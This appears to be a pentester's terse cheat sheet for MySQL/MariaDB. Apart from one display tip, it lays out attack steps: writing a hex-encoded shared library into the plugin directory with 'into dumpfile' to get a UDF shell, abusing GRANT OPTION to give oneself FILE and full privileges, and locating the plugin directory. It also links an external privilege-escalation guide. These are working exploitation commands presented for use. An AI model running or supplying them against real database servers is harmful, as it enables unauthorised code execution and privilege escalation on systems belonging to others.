# mysql mariadb

## display query output as pretty printed text with column names
Add `\G`
```
select * from users \G
```

## UDF shell
## write any binary file with file permissions
`set @shell=0x <hex here> ;`
paste in hex as a variable with no quotes.
prepare payload as plain hex with no newlines with ~/kb/bash-scripting/string-to-hex.sh
```SQL
select @@plugin_dir;
select binary @shell into dumpfile '/path/to/file/file.so';
```
additional UDF exploit info: https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql#privilege-escalation-via-library

## exploit GRANT OPTION to grant file write permissions to self
must have `GRANT OPTION` permission
```SQL
GRANT FILE ON *.* TO 'uname'@'localhost' with grant option;
grant all privileges on dbname.* to 'yourusername'@'%' with grant option;
```

## find plugin directory
```SQL
show variables like '%plugin%';
```
